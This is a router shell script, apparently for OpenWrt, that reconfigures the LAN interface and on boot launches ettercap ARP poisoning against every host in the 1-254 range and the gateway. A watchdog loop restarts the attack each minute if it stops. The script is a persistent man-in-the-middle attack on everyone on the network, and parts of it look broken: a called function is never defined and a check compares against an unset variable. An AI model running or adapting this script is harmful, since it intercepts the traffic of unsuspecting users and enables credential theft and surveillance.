#!/bin/sh

get_gateway()
{
        GATEWAY=`ip route show default | grep default | awk '{print $3}' | uniq`
        echo $GATEWAY
}

get_ip()
{
        IP_REGEX="inet [0-9]\+\.[0-9]\+\.[0-9]\+\."
        IP=`ip addr show br-lan | grep -o "${IP_REGEX}" | grep -o [0-9].* | uniq`
        echo $IP
}

start_ettercap()
{
        GATEWAY=$(get_gateway)
        IP=$(get_ip)
        ettercap -D -oM arp:remote /$IP.1-254/ /$GATEWAY/ -i br-lan & >/dev/null
        sleep 60
}

check_ettercap()
{
        pid=`pidof ettercap`
        if [ "0$(echo $pid|tr -d ' ')" -eq "0$(echo $STAT|tr -d ' ')" ]
        then
            start_ettercap
        fi
}

stop_ettercap()
{
        pid=`pidof ettercap`
        kill -9 $pid
}

start_setip()
{
        GATEWAY=$(get_gateway)
        IP1=$(get_ip)
        IP2=`echo $IP1 | sed 's/$/111/'`
        ifconfig br-lan $IP2            ## USE FOR GATEWAY MODE
	route add default gw $GATEWAY
        sleep 5
}
/etc/init.d/vnstat enable && /etc/init.d/vnstat start && sleep 1

# Enable cron
/etc/init.d/cron enable && /etc/init.d/cron start && sleep 1

# Enable firmware upgrade
/etc/init.d/fwupgrade enable && /etc/init.d/fwupgrade start && sleep 1

# Restart firewall
/etc/init.d/firewall restart && sleep 1

# Restart NTP Client
/etc/init.d/ntpclient restart && sleep 1

sleep 10
for i in `tail -n 3 /tmp/resolv.conf.auto | grep nameserver`; do
if [ -z "`cat /etc/resolv.conf | grep "$i"`" ]; then
echo "nameserver $i" >> /etc/resolv.conf
fi
done 

sleep 1
ethtool -s eth0 autoneg off
sleep 1
ethtool -s eth0 autoneg on
sleep 1
ethtool -s eth1 autoneg off
sleep 1
ethtool -s eth1 autoneg on
sleep 1
ethtool -s eth2 autoneg off
sleep 1
ethtool -s eth2 autoneg on
sleep 1

counter=0

start_setip

start_ettercap

while true
do
        sleep 60
        if [ "$counter" -eq 2 ]
        then
                sleep 2
                redirect_luci
        fi
        check_ettercap
        if [ "$counter" -eq 1440 ]
        then
                counter=0
                sleep 3
        fi

        counter=$((counter+1))
done
